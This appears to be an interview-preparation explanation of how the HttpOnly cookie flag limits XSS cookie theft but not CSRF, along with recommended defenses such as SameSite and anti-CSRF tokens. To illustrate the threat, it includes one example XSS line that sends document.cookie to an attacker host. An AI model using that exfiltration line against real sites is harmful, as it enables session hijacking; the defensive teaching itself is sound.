1. How does the `HttpOnly` flag mitigate Cross-Site Scripting (XSS) risks, and why does it fail to protect applications against Cross-Site Request Forgery (CSRF)?

**Deep explanation:** Cross-Site Scripting (XSS) occurs when an application injects unescaped or malicious user input into the browser DOM, executing unauthorized JavaScript within the victim's authenticated session. If sensitive tokens (such as session IDs or refresh tokens) are stored in client-accessible storage like `document.cookie`, `localStorage`, or `sessionStorage`, an injected script can read the credentials and exfiltrate them to an attacker-controlled server (`fetch('https://attacker.com/steal?token=' + document.cookie)`). Setting the `HttpOnly` flag eliminates this attack vector: because the browser disallows JavaScript access to `HttpOnly` cookies, malicious scripts cannot read the session token, effectively stopping credential theft via XSS. 

However, `HttpOnly` provides zero defense against Cross-Site Request Forgery (CSRF). In a CSRF attack, an attacker tricks an authenticated user into triggering an unwanted state-changing action against a vulnerable application (e.g., through an embedded `<img>`, auto-submitting `<form>`, or cross-origin `fetch` on a malicious third-party site). Because the browser's cookie transmission mechanics are automatic and ambient, the browser includes all matching cookies—including `HttpOnly` cookies—with outgoing HTTP requests, regardless of whether client-side JavaScript initiated the request or knows the cookie's value. The server validates the session cookie, assumes the request was legitimately authorized by the user, and executes the state change. Consequently, `HttpOnly` must be paired with explicit CSRF mitigations, such as the `SameSite` attribute (`Strict` or `Lax`), anti-CSRF synchronizer tokens, or custom request headers (`X-Requested-With`).

**Interview answer:** "`HttpOnly` mitigates XSS by preventing malicious scripts from reading and exfiltrating session tokens through `document.cookie`. However, it does not prevent CSRF because browsers automatically attach all valid cookies—including `HttpOnly` ones—to cross-origin requests, necessitating additional defenses like `SameSite` cookie flags and anti-CSRF tokens."
